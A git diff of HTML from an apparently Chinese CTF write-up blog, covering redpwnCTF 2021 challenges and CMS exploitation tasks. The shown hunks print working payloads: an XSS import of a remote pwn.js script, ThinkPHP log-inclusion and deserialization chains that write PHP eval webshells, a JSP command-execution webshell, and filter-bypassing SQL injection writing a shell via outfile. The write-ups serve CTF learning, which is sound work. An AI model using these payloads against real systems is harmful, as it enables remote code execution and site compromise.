 &lt;p>我们利用的就是浏览器解析html的部分，可以让不相关的几个notes拼接在一起（举个简单的栗子：在一个note里面用&lt;code>&amp;lt;p&amp;gt;&lt;/code> 另一个里面放&lt;code>&amp;lt;/p&amp;gt;&lt;/code>，中间的部分会被放在一起）这里选用的是&lt;code>&amp;lt;style&amp;gt;&lt;/code>这个tag，利用它onload的属性&lt;/p>
 &lt;p>还有一个待解决的问题是上下两个notes之间会有&lt;code>&amp;lt;div class=&amp;quot;card&amp;quot;&amp;gt;&lt;/code>的存在；这也是不用&lt;code>&amp;lt;iframe&amp;gt;&lt;/code>和它的onload属性的原因，因为浏览器是不允许&lt;code>&amp;lt;iframe&amp;gt;&lt;/code>中属性换行的&lt;/p>
 &lt;p>我们最终的payload&lt;/p>
-&lt;pre>&lt;code>body: anything
+&lt;pre tabindex="0">&lt;code>body: anything
 tag: &amp;lt;style a='
 body: anything
 tag: 'onload='`
@@ -1984,7 +2288,7 @@ $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c
 &lt;span style="color:#111">}&lt;/span>
 &lt;span style="color:#111">})();&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>为了引入这个脚本，我们新建一个paste&lt;/p>
-&lt;pre>&lt;code>${import(String.fromCharCode(47).repeat(2) + /brycec.me/.source + String.fromCharCode(47) + /pwn.js/.source)}
+&lt;pre tabindex="0">&lt;code>${import(String.fromCharCode(47).repeat(2) + /brycec.me/.source + String.fromCharCode(47) + /pwn.js/.source)}
 &lt;/code>&lt;/pre>&lt;p>其他几个版本的脚本：&lt;a href="https://gist.github.com/parrot409/6782796ba9be2088a57a679c27f4e037">ver2&lt;/a> &lt;a href="https://gist.github.com/maple3142/10e3d6f03e307016e54e7f9b6073214a">ver3&lt;/a>&lt;/p>
 &lt;p>参考：&lt;a href="https://xsleaks.dev/">XSLeaks&lt;/a> | &lt;a href="https://owasp.org/www-pdf-archive/Side_Channel_Vulnerabilities.pdf">Side Channel Vulnerabilities on the Web - Detection and Preventio&lt;/a> | &lt;a href="https://dormousehole.readthedocs.io/en/latest/patterns/flashing.html">Flask 消息闪现&lt;/a>&lt;/p>
 &lt;h2 id="webwtjs">web/wtjs&lt;/h2>
@@ -2050,13 +2354,13 @@ $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c
 &lt;p>&lt;code>nc mc.ax 31845&lt;/code>&lt;/p>
 &lt;/blockquote>
 &lt;p>nc连入后没有任何可视的回显，但是藏在了声音信息里&lt;/p>
-&lt;pre>&lt;code>\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00
+&lt;pre tabindex="0">&lt;code>\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00
 &lt;/code>&lt;/pre>&lt;p>导出，有两种值：no bell(\x00) bell(\x07)，转化为0与1&lt;/p>
-&lt;pre>&lt;code>101110101000100011100011100010001011101000101010000000101110101000111011101110001011101110001000101110100011101110101011101110000000111010111010001010101000101110001110100011101110100010000000101110111010001011100010111010001000111010001010100000001110001110111011100000001110101110100010101110001011101000101110101000111010111011100011101110111010101000000010101110100010111010100010111000111011101000111010111011101000111010100010111011101110111000111010001110111010001110101010101110001110101000111011101110111011100011101000111011101110111010001110101010101110001110111010001110111011101110111000100010101000111010101010111000111000101010100010101011101110001110101010101110001011100011101000111010001011100011101010101011100011101010100010101011101110001011101010001110101110111010111000
+&lt;pre tabindex="0">&lt;code>101110101000100011100011100010001011101000101010000000101110101000111011101110001011101110001000101110100011101110101011101110000000111010111010001010101000101110001110100011101110100010000000101110111010001011100010111010001000111010001010100000001110001110111011100000001110101110100010101110001011101000101110101000111010111011100011101110111010101000000010101110100010111010100010111000111011101000111010111011101000111010100010111011101110111000111010001110111010001110101010101110001110101000111011101110111011100011101000111011101110111010001110101010101110001110111010001110111011101110111000100010101000111010101010111000111000101010100010101011101110001110101010101110001011100011101000111010001011100011101010101011100011101010100010101011101110001011101010001110101110111010111000
 &lt;/code>&lt;/pre>&lt;p>改为莫斯电码的样子&lt;/p>
-&lt;pre>&lt;code>.-.. . - - . .-. ... | .-.. --- .-- . .-. --..-- | -.-. .... .- -. --. . | .--. .- .-. . -. ... | - --- | -.-. ..- .-. .-.. -.-- ---... | ..-. .-.. .- --. -.--. -.. .---- -. --. -....- -.. ----- -. ----. -....- --. ----- . ... -....- - .... ...-- -....- .- -. -. .- -....- -... ...-- .-.. -.--.-
+&lt;pre tabindex="0">&lt;code>.-.. . - - . .-. ... | .-.. --- .-- . .-. --..-- | -.-. .... .- -. --. . | .--. .- .-. . -. ... | - --- | -.-. ..- .-. .-.. -.-- ---... | ..-. .-.. .- --. -.--. -.. .---- -. --. -....- -.. ----- -. ----. -....- --. ----- . ... -....- - .... ...-- -....- .- -. -. .- -....- -... ...-- .-.. -.--.-
 &lt;/code>&lt;/pre>&lt;p>解密&lt;/p>
-&lt;pre>&lt;code>LETTERS LOWER, CHANGE PARENS TO CURLY: FLAG(D1NG-D0N9-G0ES-TH3-ANNA-B3L)
+&lt;pre tabindex="0">&lt;code>LETTERS LOWER, CHANGE PARENS TO CURLY: FLAG(D1NG-D0N9-G0ES-TH3-ANNA-B3L)
 &lt;/code>&lt;/pre>&lt;p>&lt;code>flag{d1ng-d0n9-g0es-th3-anna-b3l}&lt;/code>&lt;/p>
 &lt;h2 id="cryptoscissor">crypto/scissor&lt;/h2>
 &lt;blockquote>
@@ -2069,7 +2373,7 @@ $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c
 &lt;p>I want to do an RSA!&lt;/p>
 &lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/aaa49d90f7e2f6dda3ed8476879729955fefd68130dbc678e7d872dc2bcd825b/output.txt">output.txt&lt;/a>&lt;/p>
 &lt;/blockquote>
-&lt;pre>&lt;code>n: 228430203128652625114739053365339856393
+&lt;pre tabindex="0">&lt;code>n: 228430203128652625114739053365339856393
 e: 65537
 c: 126721104148692049427127809839057445790
 &lt;/code>&lt;/pre>&lt;p>&lt;del>一点都不会crypto……&lt;/del> 其实查一下&lt;code>RSA n e c&lt;/code>其实就能做出来后面的东西了&lt;/p>
@@ -2093,7 +2397,7 @@ c: 126721104148692049427127809839057445790
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710154321719.png" alt="image-20210710154321719">&lt;/p>
 &lt;p>参考：&lt;a href="https://github.com/dudnamedcyan/Redpwn2021_Writeup/blob/main/rev/bread-making.md">wp2&lt;/a> &lt;a href="https://codingmace.gitbook.io/masterward/ctf/2021/redpwn-2021#bread-making">wp3&lt;/a> &lt;a href="https://www.notion.so/bread-making-SOLVED-5cb97be799fc4fee8cd97738a9141713">wp4&lt;/a>&lt;/p>
 &lt;p>我当时的思路和想法大致还是对的，~~（虽然没有做出来吧）~~这个就是先提取出文件中的字符串部分，然后用逻辑 在交互模式下用正确的顺序输入 完整的顺下来这个流程，最后拿到flag，最后的正确顺序是这样的&lt;/p>
-&lt;pre>&lt;code>add ingredients to the bowl
+&lt;pre tabindex="0">&lt;code>add ingredients to the bowl
 add flour
 add yeast
 add salt
@@ -2118,7 +2422,7 @@ brush teeth and go to bed
 &lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716181440958.png" alt="image-20210716181440958">&lt;/p>
 &lt;p>The flag is: &lt;code>flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight}&lt;/code>&lt;/p>
 &lt;p>调试的过程是linux下的py脚本&lt;/p>
-&lt;pre>&lt;code>from pwn import *
+&lt;pre tabindex="0">&lt;code>from pwn import *
 p = remote(&amp;quot;mc.ax&amp;quot;, 31796)
 p.sendlineafter(&amp;quot;bowl&amp;quot;, &amp;quot;add flour&amp;quot;)
 p.sendlineafter(&amp;quot;flour has been added&amp;quot;, &amp;quot;add yeast&amp;quot;)
@@ -2205,11 +2509,11 @@ cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;
 &lt;p>easythinkphp&lt;/p>
 &lt;/blockquote>
 &lt;p>只有一个thinkphp 3.2.3的欢迎页面，tp的洞很多 可以直接拿来打，参考：&lt;a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">【漏洞通报】ThinkPHP3.2.x RCE漏洞通报&lt;/a>&lt;/p>
-&lt;pre>&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=phpinfo();?&amp;gt;
+&lt;pre tabindex="0">&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=phpinfo();?&amp;gt;
 /index.php?m=Home&amp;amp;c=Index&amp;amp;a=index&amp;amp;value[_filename]=./Application/Runtime/Logs/Common/21_08_01.log
 &lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801011103992.png" alt="image-20210801011103992">&lt;/p>
 &lt;p>先验证一下文档中的方法，成功，之后把phpinfo换成自己的一句话木马&lt;/p>
-&lt;pre>&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=eval($_POST['wuhu']);?&amp;gt;
+&lt;pre tabindex="0">&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=eval($_POST['wuhu']);?&amp;gt;
 &lt;/code>&lt;/pre>&lt;p>传入后 用蚁剑连接就能拿flag了~&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801012307515.png" alt="image-20210801012307515">&lt;/p>
 &lt;p>或者也可以直接使用&lt;a href="https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.2">ThinkphpGUI&lt;/a>一把梭！一键getshell 你值得拥有&lt;/p>
@@ -2217,7 +2521,7 @@ cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;
 &lt;h2 id="jspxcms">jspxcms&lt;/h2>
 &lt;p>也有现成的洞可以直接用，参考：&lt;a href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">复现jspxcms解压getshell漏洞&lt;/a> | &lt;a href="https://www.shengchulai.com/blog-NJwAv8oZV1.htm">代码审计| Jspxcms文件上传漏洞(CNVD-2019-40540)&lt;/a> | &lt;a href="https://www.anquanke.com/post/id/188788">记一次由追踪溯源发现的“不安全解压getshell”&lt;/a>&lt;/p>
 &lt;p>首先构造含jsp🐎的恶意war包，🐎长这样&lt;/p>
-&lt;pre>&lt;code class="language-jsp" data-lang="jsp">&amp;lt;%
+&lt;pre tabindex="0">&lt;code class="language-jsp" data-lang="jsp">&amp;lt;%
 if(&amp;quot;023&amp;quot;.equals(request.getParameter(&amp;quot;pwd&amp;quot;))){
 java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&amp;quot;wuhu&amp;quot;)).getInputStream();
 int a = -1;
@@ -2264,10 +2568,10 @@ out.print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);
 &lt;p>在admin后加单引号，提示&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801113627407.png" alt="image-20210801113627407">&lt;/p>
 &lt;p>表名是bees_admin，有id, admin_name, admin_password, admin_purview, is_disable共5个字段&lt;/p>
 &lt;p>简单fuzz可知：过滤了空格（用&lt;code>/**/&lt;/code>绕过）（或者用&lt;code>tab&lt;/code>绕过 或者&lt;code>%0a&lt;/code>绕过 都可以），过滤了select, outfile（双写绕过），对尖括号转义为html实体（用hex绕过）&lt;/p>
-&lt;pre>&lt;code>user=admin'/**/union/**/selselectect/**/1,2,3,4,5#
+&lt;pre tabindex="0">&lt;code>user=admin'/**/union/**/selselectect/**/1,2,3,4,5#
 &lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121138555.png" alt="image-20210801121138555">&lt;/p>
 &lt;p>回显正常，接着尝试写入shell（这里要写清楚绝对路径，在上面的一张报错的页面也有所提示了）&lt;/p>
-&lt;pre>&lt;code>admin'/**/union/**/selselectect/**/1,2,3,4,0x3c3f3d6576616c28245f504f53545b2777756875275d293b3f3e/**/into/**/ououtfiletfile/**/'/var/www/html/wuhu.php'#
+&lt;pre tabindex="0">&lt;code>admin'/**/union/**/selselectect/**/1,2,3,4,0x3c3f3d6576616c28245f504f53545b2777756875275d293b3f3e/**/into/**/ououtfiletfile/**/'/var/www/html/wuhu.php'#
 &lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121645243.png" alt="image-20210801121645243">&lt;/p>
 &lt;p>好耶，连蚁剑拿flag咯&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121853464.png" alt="image-20210801121853464">&lt;/p>
@@ -2383,7 +2687,7 @@ out.print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);
 &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$window&lt;/span>&lt;span style="color:#111">));&lt;/span>
 &lt;span style="color:#111">}&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>上传&lt;/p>
-&lt;pre>&lt;code>/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A135%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Ftemp%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D
+&lt;pre tabindex="0">&lt;code>/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A135%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Ftemp%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D
 &lt;/code>&lt;/pre>&lt;p>虽然会返回一个报错的页面，但是可以在&lt;code>/index.php/index/image/headers?url=file:///var/www/html/runtime/temp/a.php12ac95f1498ce51d2d96a249c09c1998.php&lt;/code>处验证一下是否写上了🐎，文件名字是&lt;code>md5('tag_'.md5($this-&amp;gt;tag))&lt;/code>，连接密码是ccc 直接蚁剑&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804202819779.png" alt="image-20210804202819779">&lt;/p>
 &lt;p>在&lt;a href="http://www.snowywar.top/?p=2424">雪殇的wp&lt;/a>中用的是另一个，更直接的写🐎方式，下面说一下思路（大概&lt;/p>
@@ -2401,7 +2705,7 @@ out.print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804214721944.png" alt="image-20210804214721944">&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804215658734.png" alt="image-20210804215658734">&lt;/p>
 &lt;p>抓包之后看到这里确实有post访问和upgrade_edtion参数，那就稳了，直接写🐎&lt;/p>
-&lt;pre>&lt;code>/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3E-eval($_POST[%27cmd%27])-%22,];?%3E//
+&lt;pre tabindex="0">&lt;code>/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3E-eval($_POST[%27cmd%27])-%22,];?%3E//
 &lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804220302331.png" alt="image-20210804220302331">&lt;/p>
 &lt;p>将🐎写进的目标页面&lt;code>/runtime/client_upgrade_edition.php&lt;/code>连入蚁剑 拿flag即可&lt;/p>
